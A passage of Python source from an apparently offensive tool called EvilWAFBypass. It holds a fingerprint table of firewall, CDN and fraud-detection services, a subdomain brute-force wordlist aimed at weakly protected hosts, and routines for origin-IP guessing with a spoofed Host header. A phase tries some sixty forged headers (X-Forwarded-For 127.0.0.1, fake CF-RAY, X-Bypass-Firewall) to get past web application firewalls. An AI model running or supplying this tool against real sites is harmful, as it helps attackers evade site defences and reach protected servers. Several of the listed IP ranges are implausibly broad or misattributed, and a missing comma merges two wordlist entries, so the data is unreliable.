            'headers': ['varnish', 'x-varnish', 'x-cache'],
            'ips': []  # Custom deployments
            },
            'litespeed': {
            'headers': ['litespeed', 'x-litespeed-cache'],
            'ips': []  # Custom deployments 
            },
            'openlitespeed': {
            'headers': ['openlitespeed', 'x-ols'],
            'ips': []  # Custom deployments
            },
            'cherokee': {
            'headers': ['cherokee', 'x-cherokee'],
            'ips': []  # Custom deployments
            },
            'lighttpd': {
            'headers': ['lighttpd', 'x-lighttpd'],
            'ips': []  # Custom deployments
            },
            'caddy': {
            'headers': ['caddy', 'x-caddy'],
            'ips': []  # Custom deployments
            },
            'kong': {
            'headers': ['kong', 'x-kong-upstream-latency'],
            'ips': []  # Custom deployments
         # 
        
            },
            'ambassador': {
            'headers': ['ambassador', 'x-ambassador'],
            'ips': []  # Custom deployments
            },
            'istio': {
            'headers': ['istio', 'x-envoy-upstream-service-time'],
            'ips': []  # Custom deployments
            },
            'linkerd': {
            'headers': ['linkerd', 'l5d'],
            'ips': []  # Custom deployments
            },
            'consul_connect': {
            'headers': ['consul', 'x-consul'],
            'ips': []  # Custom deployments
            },
            'zuul': {
            'headers': ['zuul', 'x-zuul'],
            'ips': []  # Custom deployments
            },
            'spring_gateway': {
            'headers': ['spring-cloud-gateway', 'x-gateway'],
            'ips': []  # Custom deployments
            },
            'express_gateway': {
            'headers': ['express-gateway', 'x-express'],
            'ips': []  # Custom deployments
            },
            'krakend': {
            'headers': ['krakend', 'x-krakend'],
            'ips': []  # Custom deployments
            },
            'tyk': {
            'headers': ['tyk', 'x-tyk'],
            'ips': []  # Custom deployments
            },
            'wso2': {
            'headers': ['wso2', 'x-wso2'],
            'ips': []  # Custom deployments
            },
            'mulesoft': {
            'headers': ['mulesoft', 'x-mule'],
            'ips': []  # Custom deployments
            },
            'apigee': {
            'headers': ['apigee', 'x-apigee'],
            'ips': ['23.236.48.0/20', '23.251.144.0/20', '35.184.0.0/13', '35.192.0.0/12', '107.178.192.0/18']
            },
            'kubernetes_ingress': {
            'headers': ['kubernetes', 'x-k8s'],
            'ips': []  # Custom deployments
        # 
        
            },
            'nginx_ingress': {
            'headers': ['ingress-nginx', 'x-ingress-controller'],
            'ips': []  # Custom deployments
            },
            'traefik_ingress': {
            'headers': ['traefik', 'x-forwarded-proto'],
            'ips': []  # Custom deployments 
            },
            'haproxy_ingress': {
            'headers': ['haproxy-ingress', 'x-haproxy'],
            'ips': []  # Custom deployments 
            },
            'istio_gateway': {
            'headers': ['istio-proxy', 'x-istio'],
            'ips': []  # Custom deployments
            },
            'ambassador_edge': {
            'headers': ['ambassador', 'x-ambassador-auth'],
            'ips': []  # Custom deployments
            },
            'gloo_edge': {
            'headers': ['gloo', 'x-gloo'],
            'ips': []  # Custom deployments
            },
            'contour': {
            'headers': ['contour', 'x-contour'],
            'ips': []  # Custom deployments
            },
            'kong_kubernetes': {
            'headers': ['kong-ingress', 'x-kong'],
            'ips': []  # Custom deployments
            },
            'lambda_edge': {
            'headers': ['lambda@edge', 'x-amz-executed-version'],
            'ips': []  # Uses AWS IP ranges
        # 
        
            },
            'azure_functions': {
            'headers': ['azure-functions', 'x-azure-functions'],
            'ips': ['20.0.0.0/8', '40.0.0.0/8', '52.0.0.0/8']  # Azure IP ranges 
            },
            'cloud_functions': {
            'headers': ['google-cloud-functions', 'x-cloud-trace'],
            'ips': ['8.0.0.0/8', '34.0.0.0/8', '35.0.0.0/8']  # Google Cloud IP ranges
            },
            'cloudflare_workers': {
            'headers': ['cloudflare-workers', 'cf-worker'],
            'ips': ['104.16.0.0/12', '172.64.0.0/13', '173.245.48.0/20']  # Cloudflare IPs
            },
            'fastly_compute': {
            'headers': ['fastly-compute', 'x-compute'],
            'ips': ['23.235.32.0/20', '146.75.0.0/16', '151.101.0.0/16']  # Fastly IPs
            },
            'vercel': {
            'headers': ['vercel', 'x-vercel'],
            'ips': ['76.76.21.0/24', '192.241.128.0/17', '199.27.72.0/21']
            },
            'netlify': {
            'headers': ['netlify', 'x-nf-request-id'],
            'ips': ['54.152.0.0/16', '54.156.0.0/16', '54.224.0.0/15']
            },
            'deno_deploy': {
            'headers': ['deno', 'x-deno-deploy'],
            'ips': ['143.42.0.0/16', '143.198.0.0/16']
            },
            'panther': {
            'headers': ['panther', 'x-panther'],
            'ips': []  # Cloud-based, uses provider IPs
        # 
        
            },
            'lacework': {
            'headers': ['lacework', 'x-lacework'],
            'ips': ['35.80.0.0/16', '52.32.0.0/16', '54.70.0.0/16']
            },
            'aqua_security': {
            'headers': ['aqua', 'x-aqua'],
            'ips': []  # Cloud-based
            },
            'twistlock': {
            'headers': ['twistlock', 'x-twistlock'],
            'ips': []  #  part of Prisma Cloud
            },
            'prisma_cloud': {
            'headers': ['prisma', 'x-prisma'],
            'ips': ['35.80.0.0/16', '52.32.0.0/16', '54.70.0.0/16']  # Palo Alto Networks IPs
            },
            'sysdig': {
            'headers': ['sysdig', 'x-sysdig'],
            'ips': []  # Cloud-based
            },
            'falco': {
            'headers': ['falco', 'x-falco'],
            'ips': []  # Open source, custom deployments
            },
            'neuvector': {
            'headers': ['neuvector', 'x-neuvector'],
            'ips': []  # Cloud-based 
            },
            'trend_micro': {
            'headers': ['trendmicro', 'x-trend'],
            'ips': ['150.70.0.0/16', '203.10.0.0/16', '210.150.0.0/16'] 
            },
            'datadome': {
            'headers': ['datadome', 'x-datadome', 'dd_'],
            'ips': ['35.180.0.0/16', '52.47.0.0/16', '54.93.0.0/16']
        # 
        
            },
            'reblaze': {
            'headers': ['reblaze', 'x-reblaze'],
            'ips': ['45.134.140.0/22', '185.229.0.0/22', '199.182.0.0/22']
            },
            'perimeterx': {
            'headers': ['perimeterx', '_px', 'x-px'],
            'ips': ['52.28.0.0/16', '52.57.0.0/16', '52.208.0.0/16'] 
            },
            'shape_security': {
            'headers': ['shape', 'x-shape'],
            'ips': []  # 
            },         
            'human_security': {
            'headers': ['humansecurity', 'x-human'],
            'ips': ['35.201.0.0/16', '104.199.0.0/16', '146.148.0.0/16']  # Google Cloud IPs
            },
            'human': {
            'headers': ['human', 'x-human-sec'],
            'ips': ['35.201.0.0/16', '104.199.0.0/16', '146.148.0.0/16']  # Same as HUMAN Security 
            },
            'arkose_labs': {
            'headers': ['arkose', 'x-arkose'],
            'ips': ['13.52.0.0/16', '54.67.0.0/16', '104.196.0.0/16']  # AWS IP ranges  
            },
            'castle': {
            'headers': ['castle', 'x-castle'],
            'ips': ['52.52.0.0/16', '54.67.0.0/16', '104.196.0.0/16']  # AWS IP ranges   
            },
            'biocatch': {
            'headers': ['biocatch', 'x-biocatch'],
            'ips': ['52.21.0.0/16', '52.45.0.0/16', '54.84.0.0/16']  # AWS IP ranges 
            },
            'threatmetrix': {
            'headers': ['threatmetrix', 'x-tm'],
            'ips': ['52.32.0.0/16', '52.36.0.0/16', '54.148.0.0/16']  # AWS IP ranges (LexisNexis)
            },
            'kount': {
            'headers': ['kount', 'x-kount'],
            'ips': ['52.36.0.0/16', '52.43.0.0/16', '54.70.0.0/16']  # AWS IP ranges
            },
            'riskified': {
            'headers': ['riskified', 'x-riskified'],
            'ips': ['52.200.0.0/16', '52.205.0.0/16', '54.88.0.0/16']  # AWS IP ranges
        # 
        
            },
            'signifyd': {
            'headers': ['signifyd', 'x-signifyd'],
            'ips': ['52.33.0.0/16', '52.43.0.0/16', '54.70.0.0/16']  # AWS IP ranges  
            },
            'sift': {
            'headers': ['sift', 'x-sift'],
            'ips': ['52.32.0.0/16', '52.36.0.0/16', '54.148.0.0/16']  # AWS IP ranges  
            },
            'forter': {
            'headers': ['forter', 'x-forter'],
            'ips': ['52.48.0.0/16', '52.64.0.0/16', '54.66.0.0/16']  # AWS IP ranges
            },
            'clearsale': {
            'headers': ['clearsale', 'x-clearsale'],
            'ips': ['52.67.0.0/16', '54.94.0.0/16', '177.71.0.0/16']  # AWS + Brazil IPs 
            },
            'maxmind': {
            'headers': ['maxmind', 'x-maxmind'],
            'ips': ['162.158.0.0/15', '172.69.0.0/16', '108.162.0.0/16']  # Cloudflare IPs
        # 
        
            },
            'ipqualityscore': {
            'headers': ['ipqualityscore', 'x-ipqs'],
            'ips': ['104.156.0.0/16', '104.238.0.0/16', '107.191.0.0/16']  # Various hosting IPs
            },
            'minfraud': {
            'headers': ['minfraud', 'x-minfraud'],
            'ips': ['162.158.0.0/15', '172.69.0.0/16']  # MaxMind/Cloudflare IPs
            },
            'fraudlabs': {
            'headers': ['fraudlabs', 'x-fraudlabs'],
            'ips': ['104.200.0.0/16', '192.241.0.0/16', '198.199.0.0/16']  # Various hosting IPs
            },
            'shield': {
            'headers': ['shield', 'x-shield'],
            'ips': ['52.76.0.0/16', '54.169.0.0/16', '54.255.0.0/16']  # AWS Singapore IPs
            },
            'cybersource': {
            'headers': ['cybersource', 'x-cybersource'],
            'ips': ['52.32.0.0/16', '52.36.0.0/16', '54.148.0.0/16']  # Visa AWS IPs
        # 
        
            },
            'adyen': {
            'headers': ['adyen', 'x-adyen'],
            'ips': ['52.50.0.0/16', '52.57.0.0/16', '54.93.0.0/16']  # AWS EU IPs
            },
            'stripe_radar': {
            'headers': ['stripe', 'x-stripe-radar'],
            'ips': ['52.32.0.0/16', '52.36.0.0/16', '54.148.0.0/16']  # Stripe AWS IPs 
            },
            'paypal': {
            'headers': ['paypal', 'x-pp-silover'],
            'ips': ['64.4.0.0/16', '66.211.0.0/16', '173.0.0.0/16']  # PayPal IP ranges
            },
            'afterpay': {
            'headers': ['afterpay', 'x-afterpay'],
            'ips': ['52.62.0.0/16', '54.66.0.0/16', '54.79.0.0/16']  # AWS Australia IPs   
            },
            'affirm': {
            'headers': ['affirm', 'x-affirm'],
            'ips': ['52.32.0.0/16', '52.36.0.0/16', '54.148.0.0/16']  # AWS IP ranges  
            },
            'sezzle': {
            'headers': ['sezzle', 'x-sezzle'],
            'ips': ['52.15.0.0/16', '52.52.0.0/16', '54.67.0.0/16']  # AWS IP ranges
            },
            'zip': {
            'headers': ['zip', 'x-zip-pay'],
            'ips': ['52.63.0.0/16', '54.66.0.0/16', '54.79.0.0/16']  # AWS Australia IPs
        
            }
        }    
                      
            
        

    async def detect_firewall(self, domain):
        """Detect firewall"""
        print(f"{Colors.GREEN}[*] Scanning for firewall protection...{Colors.END}")
        
        try:
            ip = socket.gethostbyname(domain)
            print(f"{Colors.GREEN}[*] Target IP: {ip}{Colors.END}")
            
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://{domain}", timeout=10, ssl=False) as response:
                    headers = str(response.headers).lower()
                    
                    for fw_name, patterns in self.firewall_patterns.items():
                        for header in patterns['headers']:
                            if header in headers:
                                print(f"{Colors.GREEN}[!] Firewall Detected: {Colors.CYAN}{fw_name.lower()}{Colors.END}")
                                return fw_name, 95
            
            print(f"{Colors.GREEN}[+] No major firewall detected{Colors.END}")
            return None, 0
            
        except Exception as e:
            print(f"{Colors.RED}[!] Firewall detection error: {e}{Colors.END}")
            return None, 0


#subdomains depend on nature of the site 

class PowerfulBruteforce:
    def __init__(self):
        self.subdomain_wordlist = self.generate_wordlist()
    
    def generate_wordlist(self):
        """Generate subdomain wordlist with weak protection targets"""
        words = [
            'api', 'admin', 'cpanel', 'backend', 'origin', 'direct',
            'dev', 'staging', 'test', 'cdn', 'assets', 'static',
            'app', 'mobile', 'mail', 'ftp', 'webmail', 'blog',
            'development', 'develop', 'alpha', 'beta', 'demo', 'sandbox',
            'preprod', 'pre-prod', 'preproduction', 'uat', 'qa', 'quality',
            'experimental', 'pilot', 'prototype',
            'testapi', 'stagingapi', 'devapi', 'adminapi', 'internalapi',
            'privateapi', 'secureapi', 'authapi', 'oauth', 'sso',
            'old', 'legacy', 'classic', 'v1', 'v2', 'v3', 'version1',
            'previous', 'archive', 'backup', 'temp', 'tmp',
            'local', 'localhost', 'internal', 'intranet', 'vpn', 'remote',
            'regional', 'europe', 'asia', 'us', 'uk', 'eu', 'na',
            'manage', 'manager', 'management', 'control', 'controller',
            'dashboard', 'portal', 'gateway', 'proxy', 'router',
            'monitor', 'monitoring', 'analytics', 'stats', 'statistics',
            'metric', 'metrics', 'status', 'health', 'ping',
            'db', 'database', 'sql', 'mysql', 'postgres', 'mongo',
            'storage', 'store', 'data', 'files', 'uploads',
            'security', 'secure', 'auth', 'authentication', 'login',
            'signin', 'oauth2', 'saml', 'jwt', 'token',
            'server', 'servers', 'cluster', 'kubernetes', 'k8s',
            'docker', 'vm', 'virtual', 'cloud', 'aws', 'azure',
            'alternate', 'alt', 'secondary', 'shadow', 'mirror',
            'replica', 'clone', 'copy', 'duplicate',
            'root', 'super', 'superuser', 'master', 'primary',
            'main', 'core', 'central', 'global', 'world'
            'phpmyadmin', 'adminer', 'webmin', 'plesk', 'directadmin',
            'whm', 'cpanel', 'webmail', 'roundcube', 'squirrelmail',
            'noc', 'operations', 'tech', 'technical', 'support',
            'helpdesk', 'it', 'infrastructure', 'network',
            'git', 'svn', 'jenkins', 'jenkinsci', 'teamcity',
            'bamboo', 'nexus', 'artifactory', 'sonarqube',
            'publicapi', 'openapi', 'restapi', 'graphql', 'grpc',
            'websocket', 'socket', 'ws', 'wss',
            'kibana', 'grafana', 'prometheus', 'elasticsearch',
            'redis', 'memcached', 'rabbitmq', 'kafka',
            'hidden', 'secret', 'private', 'confidential',
            'restricted', 'securearea', 'adminarea'
        ]
        return words



class EvilWAFBypass:
    def __init__(self):
        self.session = None
        self.user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']
        self.detector = FirewallDetector()
        self.bruteforce =  PowerfulBruteforce()

    

    def normalize_domain(self, domain):
        """Fix URL parsing issue - handle both example.com and https://example.com"""
        domain = domain.strip()
        
        if domain.startswith('http://'):
            domain = domain[7:]
        elif domain.startswith('https://'):
            domain = domain[8:]
        
        if domain.startswith('www.'):
            domain = domain[4:]
        
        domain = domain.rstrip('/')
        
        return domain

    async def init_session(self):
        """Initialize session"""
        timeout = aiohttp.ClientTimeout(total=20)
        connector = aiohttp.TCPConnector(limit=10, ssl=False)
        self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)

    async def close_session(self):
        if self.session:
            await self.session.close()

    def get_random_ua(self):
        return random.choice(self.user_agents)

    # 
    
    async def smart_subdomain_validation(self, domain):
        """Smart subdomain discovery"""
        import os
        import shutil

        def get_terminal_width():
            try:
               return shutil.get_terminal_size().columns
            except:
               return 80
        
        
        term_width = get_terminal_width()
        
        def print_bg_header(text, bg_color='\033[40m'):
            """Print full width background header"""
            padding = (term_width - len(text)) // 2
            spaces = " " * padding + text + " " * (term_width - len(text) - padding)
            print(f"{bg_color}{spaces}\033[0m")   
        
        
        print_bg_header(" PHASE 1: Smart Subdomain Discovery ", '\033[46m')    
        valid_subs = []
        total_count = len(self.bruteforce.subdomain_wordlist)
        
        
        table_header = f"{Colors.BLACK}{'SUBDOMAIN':<30}{Colors.END}{Colors.BLACK} {'STATUS':<20}{Colors.END}{Colors.BLACK} {'COUNT':<8}{Colors.END}"
        print_bg_header(table_header, '\033[44m')  
        i = 0        
        for sub in self.bruteforce.subdomain_wordlist:
            i += 1
            subdomain = f"{sub}.{domain}"
            counter = f"{Colors.RED}{i:>3}{Colors.WHITE}/{Colors.CYAN}{total_count}{Colors.END}"


            try:
                socket.setdefaulttimeout(3)
                ip = socket.gethostbyname(subdomain)
                valid_subs.append(subdomain)
                print(f"{Colors.WHITE}[-]{Colors.END} {Colors.WHITE}{subdomain:<30}{Colors.END} {Colors.GREEN}DNS found{Colors.END} {counter:>15}")
                
            except socket.gaierror:
                print(f"{Colors.WHITE}[-]{Colors.END} {Colors.WHITE}{subdomain:<30}{Colors.END} {Colors.CYAN}No DNS record{Colors.END} {counter:>15}")
                continue
            except Exception:
                print(f"{Colors.WHITE}[-]{Colors.END} {Colors.WHITE}{subdomain:<30}{Colors.END} {Colors.RED}DNS error{Colors.END} {counter:>15}")
                continue
        
        print(f"{Colors.GREEN}[+] Found {len(valid_subs)} valid subdomains{Colors.END}")
        return valid_subs

    async def test_valid_subdomains(self, domain, valid_subdomains):
        """Test subdomains with improved logic"""
        if not valid_subdomains:
            print(f"{Colors.RED}[-] No valid subdomains to test{Colors.END}")
            return []
        
        print(f"{Colors.GREEN}[+] Testing {len(valid_subdomains)} valid subdomains...{Colors.END}")
        working_subs = []
        
        for subdomain in valid_subdomains:
            if await self.improved_subdomain_test(subdomain, domain):
                working_subs.append(subdomain)
                print(f"{Colors.WHITE}[-] {subdomain:<40} {Colors.GREEN}Bypass Success{Colors.END}")
            else:
                print(f"{Colors.WHITE}[-] {subdomain:<40} {Colors.RED}Bypass failed{Colors.END}")
            
            await asyncio.sleep(0.2)
        
        await self.subdomain_summary_report(valid_subdomains, working_subs, domain)
        return working_subs
        
        




    async def improved_subdomain_test(self, subdomain, main_domain):
        """Subdomain test with multiple attempts"""
        try:
            headers = {'User-Agent': self.get_random_ua()}
            
            # Try HTTPS first
            async with self.session.get(f"https://{subdomain}", headers=headers, timeout=5, ssl=False) as resp:
                if resp.status == 200:
                    return True
            
            # Try HTTP if HTTPS fails
            async with self.session.get(f"http://{subdomain}", headers=headers, timeout=5) as resp:
                if resp.status == 200:
                    return True
            
            return False
            
        except Exception:
            return False





    async def subdomain_summary_report(self, valid_subdomains, working_subs, domain):
        """Print complete subdomain discovery summary with all subdomains details"""
    
        def print_bg_header(text, bg_color):
            import shutil
            try:
                width = shutil.get_terminal_size().columns
            except:
                width = 80
            padding = (width - len(text)) // 2
            spaces = " " * padding + text + " " * (width - len(text) - padding)
            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
    
    
        print_bg_header("", '\033[44m')
        print_bg_header(" SUBDOMAIN DISCOVERY ANALYSIS REPORT ", '\033[44m')
        print_bg_header("", '\033[44m')
    
    
        print(f"\n{Colors.CYAN}[+] Generating complete summary...{Colors.END}")
        await asyncio.sleep(1)
    
    
        print_bg_header(" COMPLETE SUBDOMAIN DISCOVERY SUMMARY ", '\033[45m')
        await asyncio.sleep(0.5)
    
    
        total_tested = len(self.bruteforce.subdomain_wordlist)
        dns_found = len(valid_subdomains)
        bypass_success = len(working_subs)
        dns_failed = total_tested - dns_found
    
        dns_percent = (dns_found / total_tested) * 100 if total_tested > 0 else 0
        bypass_percent = (bypass_success / total_tested) * 100 if total_tested > 0 else 0
        bypass_success_rate = (bypass_success / dns_found) * 100 if dns_found > 0 else 0
    
    
        print(f"\n{Colors.CYAN}{'OVERALL STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
    
        print(f"{Colors.WHITE}{'Total Subdomains Tested':<25}{Colors.END} {Colors.YELLOW}{total_tested:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'DNS Records Found':<25}{Colors.END} {Colors.GREEN}{dns_found:<8}{Colors.END} {Colors.CYAN}{dns_percent:6.1f}%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Bypass Successful':<25}{Colors.END} {Colors.GREEN}{bypass_success:<8}{Colors.END} {Colors.CYAN}{bypass_percent:6.1f}%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Success Rate':<25}{Colors.END} {Colors.GREEN}{bypass_success:<8}{Colors.END} {Colors.CYAN}{bypass_success_rate:6.1f}%{'':<6}{Colors.END}")
    
        await asyncio.sleep(0.5)
    
    
        if valid_subdomains:
            print(f"\n{Colors.GREEN}{'ALL DNS FOUND SUBDOMAINS':<45} {'IP':<15} {'BYPASS':<10}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*45} {'─'*15} {'─'*10}{Colors.END}")
        
            for i, subdomain in enumerate(valid_subdomains, 1):
                try:
                    ip = socket.gethostbyname(subdomain)
                    ip_display = ip
                except:
                    ip_display = 'N/A'
            
            
                bypass_text = "[*]Success" if subdomain in working_subs else "Failed"
                bypass_color = Colors.GREEN if subdomain in working_subs else Colors.RED
            
                print(f"{Colors.WHITE}{i:>3}. {subdomain:<40}{Colors.END} {Colors.CYAN}{ip_display:<15}{Colors.END} {bypass_color}{bypass_text:<10}{Colors.END}")
    
        await asyncio.sleep(0.5)
    
    
        if working_subs:
            print(f"\n{Colors.GREEN}{'Success Bypasses ONLY':<45} {'IP':<15} {'STATUS':<10}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*45} {'─'*15} {'─'*10}{Colors.END}")
        
            for i, subdomain in enumerate(working_subs, 1):
                try:
                    ip = socket.gethostbyname(subdomain)
                    ip_display = ip
                except:
                    ip_display = 'N/A'
            
                print(f"{Colors.WHITE}{i:>2}. {subdomain:<40}{Colors.END} {Colors.CYAN}{ip_display:<15}{Colors.END} {Colors.GREEN}{'Live':<10}{Colors.END}")
    
        await asyncio.sleep(0.5)
    
    
        if dns_failed > 0:
            failed_subs = []
            for sub in self.bruteforce.subdomain_wordlist:
                subdomain = f"{sub}.{domain}"
                if subdomain not in valid_subdomains:
                    failed_subs.append(subdomain)
        
            print(f"\n{Colors.RED}{'DNS Failed subdomains':<45}{Colors.END}")
            print(f"{Colors.RED}{'─'*45}{Colors.END}")
        
            for i, subdomain in enumerate(failed_subs, 1):
                print(f"{Colors.WHITE}{i:>3}. {subdomain:<40}{Colors.END} {Colors.RED}{'[*]NO DNS':<10}{Colors.END}")
    
        await asyncio.sleep(0.5)
    
  
        bypass_failed_subs = [sub for sub in valid_subdomains if sub not in working_subs]
        if bypass_failed_subs:
            print(f"\n{Colors.YELLOW}{'BYPASS FAILED SUBDOMAINS':<45} {'IP':<15}{Colors.END}")
            print(f"{Colors.YELLOW}{'─'*45} {'─'*15}{Colors.END}")
        
            for i, subdomain in enumerate(bypass_failed_subs, 1):
                try:
                    ip = socket.gethostbyname(subdomain)
                    ip_display = ip
                except:
                    ip_display = 'N/A'
            
                print(f"{Colors.WHITE}{i:>3}. {subdomain:<40}{Colors.END} {Colors.CYAN}{ip_display:<15}{Colors.END} {Colors.RED}{'[*]Failed':<10}{Colors.END}")
    
    
        await asyncio.sleep(0.5)
        final_success_rate = (bypass_success / total_tested) * 100 if total_tested > 0 else 0
    
    
        print()  
        print_bg_header("", '\033[44m')
        print_bg_header(f" SCAN COMPLETED: {final_success_rate:.1f}% Success Rate ", '\033[44m')
        print_bg_header(f" {bypass_success}/{total_tested} subdomains successfully bypassed ", '\033[44m')
        print_bg_header("", '\033[44m')






    async def dns_history_bypass(self, domain):
        """DNS history bypass"""
        print(f"\033[41m PHASE 2: DNS History Bypass\033[0m")
        
        working_ips = []
        
        try:
            current_ip = socket.gethostbyname(domain)
            ip_variants = self.generate_ip_variants(current_ip)
            
            print(f"{Colors.WHITE}[*] Testing {len(ip_variants)} IP variants{Colors.END}")
            
            for ip in ip_variants:
                if await self.improved_ip_test(domain, ip):
                    working_ips.append(ip)
                    print(f"{Colors.WHITE}[-] {ip:<40} {Colors.GREEN}Bypass Success{Colors.END}")
                else:
                    print(f"{Colors.WHITE}[-] {ip:<40} {Colors.RED}Bypass Failed{Colors.END}")
                
                await asyncio.sleep(0.2)
        
        except Exception as e:
            print(f"{Colors.RED}[-] DNS bypass error: {e}{Colors.END}")
        
        return working_ips

    def generate_ip_variants(self, ip):
        """Generate IP variants"""
        variants = [ip]
        parts = ip.split('.')
        
        if len(parts) == 4:
            # More  IP variants firewalls especially cloudflare
            variants.extend([
                f"{parts[0]}.{parts[1]}.{parts[2]}.1",
                f"{parts[0]}.{parts[1]}.{parts[2]}.2",
                f"{parts[0]}.{parts[1]}.{parts[2]}.10",
                f"{parts[0]}.{parts[1]}.{parts[2]}.50",
                f"{parts[0]}.{parts[1]}.{parts[2]}.100",
                f"{parts[0]}.{parts[1]}.{parts[2]}.200",
                f"{parts[0]}.{parts[1]}.{parts[2]}.254",
                f"{parts[0]}.{parts[1]}.{parts[2]}.255",
                f"{parts[0]}.{parts[1]}.{parts[2]}.101",
                f"{parts[0]}.{parts[1]}.{parts[2]}.102",
                f"{parts[0]}.{parts[1]}.{parts[2]}.103",
                f"{parts[0]}.{parts[1]}.{parts[2]}.253",
                f"{parts[0]}.{parts[1]}.{parts[2]}.252",
            ])
        
        return variants

    async def improved_ip_test(self, domain, ip):
        """IP test with Host header"""
        try:
            headers = {
                'Host': domain,
                'User-Agent': self.get_random_ua(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            async with self.session.get(f"http://{ip}", headers=headers, timeout=5) as response:
                if response.status == 200:
                    content = await response.text()
                    if len(content) > 1000:
                        return True
            
            return False
            
        except Exception:
            return False

    



    
    

    
    async def header_manipulation(self, domain):
        """Header Manipulation for Firewall Bypass"""
        print(f"\033[41m PHASE 3: Header Manipulation\033[0m")
        
       
        header_payloads = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Forwarded-Host': domain},
            {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
            {'Referer': 'https://www.google.com/'},
            {'X-Forwarded-Proto': 'https'},
            {'X-Forwarded-Port': '443'},
            {'CF-Connecting-IP': '127.0.0.1'},
            {'True-Client-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Cluster-Client-IP': '127.0.0.1'},
            {'X-Azure-ClientIP': '127.0.0.1'},
            {'X-AWS-ELB-Client-IP': '127.0.0.1'},
            {'CF-RAY': 'fake-ray-id'},
            {'X-Amz-Cf-Pop': 'LAX50-C1'},
            {'X-Amz-Cf-Id': 'fake-cf-id'},
            {'X-Edge-Location': 'lax'},
            {'X-Cache': 'Hit from cloudfront'},
            {'X-Content-Type-Options': 'nosniff'},
            {'X-Frame-Options': 'SAMEORIGIN'},
            {'X-XSS-Protection': '1; mode=block'},
            {'Strict-Transport-Security': 'max-age=31536000'},
            {'Content-Security-Policy': "default-src 'self'"},
            {'X-Corporate-Proxy': 'internal'},
            {'X-Internal-Request': 'true'},
            {'X-Corp-Network': 'trusted'},
            {'X-Proxy-User': 'admin'},
            {'X-Auth-Key': 'internal'},
            {'X-Debug': 'false'},
            {'X-Development': 'false'},
            {'X-Staging': 'false'},
            {'X-Env': 'production'},
            {'X-App-Version': '1.0.0'},
            {'X-LB-Health': 'healthy'},
            {'X-Backend-Server': 'server01'},
            {'X-Server-Pool': 'production'},
            {'X-Load-Balancer': 'aws-elb'},
            {'X-Mobile-App': 'false'},
            {'X-App-Platform': 'web'},
            {'X-Device-ID': 'desktop-web'},
            {'X-API-Key': 'legacy-key'},
            {'X-Cache-Bypass': 'true'},
            {'X-No-Cache': '1'},
            {'Cache-Control': 'no-cache, no-store'},
            {'Pragma': 'no-cache'},
            {'X-AWS-Request-ID': 'fake-request-id'},
            {'X-AWS-Region': 'us-east-1'},
            {'X-AWS-ALB': 'app/load-balancer/fake-id'},
            {'X-Google-Real-IP': '127.0.0.1'},
            {'X-Cloud-Trace-Context': 'fake-trace-id'},
            {'X-Goog-IAP-Profile': 'fake-profile'},
            {'X-Azure-Ref': 'fake-azure-ref'},
            {'X-Azure-SocketIP': '127.0.0.1'},
            {'X-Azure-FDID': 'fake-front-door-id'},
            {'CF-IPCountry': 'US'},
            {'CF-Visitor': '{"scheme":"https"}'},
            {'CF-Worker': 'production'},
            {'X-Bypass-Firewall': 'true'},
            {'X-Security-Scan': 'completed'},
        ]
        
        working_headers = []
        print(f"{Colors.WHITE}[*] Testing {len(header_payloads)} header combinations{Colors.END}")
        
        for headers in header_payloads:
            header_name = list(headers.keys())[0]
            
            try:
                status, response_data = await self.detailed_header_test(domain, headers)
                
               
                if status == 200:
                    color = Colors.YELLOW
                    status_text = "[*] 200 Bypass Success"
                    working_headers.append(headers)
                elif status == 403:
                    color = Colors.RED
                    status_text = "[*] 403 Blocked"
                elif status == 404:
                    color = Colors.BLUE
                    status_text = "[*] 404 Not Found"
                elif status == 500:
                    color = Colors.MAGENTA
                    status_text = "[*] 500 Server Error"
                elif status == 301 or status == 302:
                    color = Colors.GREEN
                    status_text = f"[*] {status} Redirect"
                elif status == 0:
                    color = Colors.RED
                    status_text = "[*] Connection Failed"
                else:
                    color = Colors.WHITE
                    status_text = f"[*] Status {status}"
                
                print(f"{Colors.WHITE}[-] {header_name:<25} {color}{status_text}{Colors.END}")
            
            except Exception as e:
                print(f"{Colors.WHITE}[-] {header_name:<25} {Colors.RED}[*] Test Error: {str(e)[:20]}{Colors.END}")
            
            await asyncio.sleep(0.1)
        
        # show  summary
        print(f"\n{Colors.WHITE}[*] Results Summary:{Colors.END}")
        print(f"{Colors.WHITE}[-] Working Headers: {Colors.YELLOW}{len(working_headers)}{Colors.END}")
        print(f"{Colors.WHITE}[-] Total Tested: {Colors.WHITE}{len(header_payloads)}{Colors.END}")
        
        return working_headers

    async def detailed_header_test(self, domain, headers):
        """Actual function ya kukagua status codes kwa kina - FIXED!"""
        try:
            import aiohttp
            
            if not self.session:
                self.session = aiohttp.ClientSession()
                
            default_headers = {
                'User-Agent': self.get_random_ua(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
            default_headers.update(headers)
            
            async with self.session.get(f"https://{domain}", 
                                      headers=default_headers, 
                                      timeout=10, 
                                      ssl=False,
                                      allow_redirects=False) as response:  # No redirects to see real status
                
                # Read the response content to check actual blocking
                content = await response.text()
                
                response_data = {
                    'status': response.status,
                    'content_length': len(content),
                    'headers': dict(response.headers),
                    'url': str(response.url),
                    'is_blocked': self.is_blocked_page(content, response.status)
                }
                return response.status, response_data
                
        except aiohttp.ClientConnectorError:
            return 0, {'error': 'Connection failed'}
        except aiohttp.ServerTimeoutError:
            return 0, {'error': 'Timeout'}
        except Exception as e:
